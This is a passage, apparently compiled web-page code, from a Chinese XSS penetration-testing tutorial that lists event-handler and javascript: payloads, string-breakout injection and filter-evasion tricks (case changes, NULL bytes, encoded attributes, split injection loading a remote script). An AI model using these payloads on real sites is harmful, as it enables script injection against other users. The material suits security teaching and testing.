3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br")])]),a("p",[s._v("当我们利用上一种方式也是可以触发弹窗，但是每次都需要去点一下文本框才能触发，在实战场景中比较鸡肋")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://www.loongten.com/2019/12/23/pentest-learn-xss/12.png",alt:"sdf"}})]),s._v(" "),a("p",[s._v("Payload")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v("'"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("a")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://www.loongten.com/2019/12/23/pentest-learn-xss/13.png",alt:"sdf"}})]),s._v(" "),a("p",[s._v("使用这个payload，可以直接弹窗")]),s._v(" "),a("p",[s._v("我们首先用 "),a("code",[s._v("'")]),s._v("去截断了前面的字符串，然后拼接完整的函数，中间插入我们需要执行的代码:"),a("code",[s._v("alert(1);")]),s._v(" 完成了这一步之后，因为源函数后面还有个"),a("code",[s._v("}")]),s._v("，我们需要自己写个函数去完善掉 "),a("code",[s._v("function a(){//")]),s._v(" ，并且把最后的单引号和分号结束掉，那么在页面一打开我们的函数就会被执行。")]),s._v(" "),a("h4",{attrs:{id:"脚本标签"}},[s._v("脚本标签 "),a("a",{staticClass:"header-anchor",attrs:{href:"#脚本标签"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("事件处理器")])]),s._v(" "),a("p",[s._v("有大量事件处理器可与各种标签结合使用，用于执行脚本。")]),s._v(" "),a("p",[s._v("一些示例，可在不需要任何用户交互的情况下执行脚本：")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("style onreadystatechange"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("style"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("iframe onreadystatechange"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("iframe"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("object onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("object"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img type"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("image src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("valid"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("gif onreadystatechange"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("input type"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("image src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("valid"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("gif onreadystatechange"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("body onbeforeactivate"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("body"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("video src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("video"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("audio src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("strong",[s._v("脚本伪协议")])]),s._v(" "),a("p",[s._v("脚本伪协议可用在任何位置，以在需要URL的属性中执行行内脚本。")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("object data"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("javascript"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("object"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("iframe src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("javascript"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("iframe"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("event"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("source src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("javascript"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("event"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("source"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h4",{attrs:{id:"避开过滤-html"}},[s._v("避开过滤:HTML "),a("a",{staticClass:"header-anchor",attrs:{href:"#避开过滤-html"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("标签名称")])]),s._v(" "),a("p",[s._v("改变字符大小写")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("iMg onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("插入NULL字节")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("00")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("img onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("标签名称后的空格")]),s._v(" "),a("p",[s._v("一些可用于替代空格的字符")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("09")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("d"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v('"onerror'),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("strong",[s._v("属性名称")])]),s._v(" "),a("p",[s._v("绕开一些检查以"),a("code",[s._v("on")]),s._v("开头的过滤器")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img o"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("00")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("nerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("属性分隔符,把多个属性分隔开")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'alert(1)'")]),s._v("src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("属性值")])]),s._v(" "),a("p",[s._v("可以用NULL字节或HTML编码属性值")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("00")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("lert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("img onerror"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("#x006c"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("blockquote",[a("p",[s._v("HTML编码 十六进制编码 base64编码 ASCII编码")])]),s._v(" "),a("p",[s._v("以下属性可以被编码：")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v("href"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\naction"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\nformaction"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\nlocation"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\non"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*=")]),s._v("\nname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\nbackground"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\nposter"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\nsrc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\ncode"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\ndata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//只支持base64")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[a("strong",[s._v("字符集")])]),s._v(" "),a("p",[s._v("有时可用一些非标准编码绕开过滤器")]),s._v(" "),a("p",[s._v("UTF-7、US-ASCII、UTF-16")]),s._v(" "),a("p",[a("strong",[s._v("拆分跨站：")])]),s._v(" "),a("p",[s._v("当应用程序没有过滤<、>关键字却限制了字符长度时可用拆分跨站")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("z"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<script src='")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n\n*/")]),s._v("z"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'test.c'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n\n*/")]),s._v("z"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'n/1.js><0/script>'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("/*\n\n*/")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("z"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("最终执行")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("<script>\n\nz='undefined<script src=test.cn/1.js><\/script>';\n\ndocument.write(z)\n\n<\/script>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("h4",{attrs:{id:"避开过滤-脚本代码"}},[s._v("避开过滤：脚本代码 "),a("a",{staticClass:"header-anchor",attrs:{href:"#避开过滤-脚本代码"}},[s._v("#")])]),s._v(" "),a("p",[s._v("有些过滤器可能阻止javascript关键字和表达式，有用的字符，比如引号、括号和圆点。")]),s._v(" 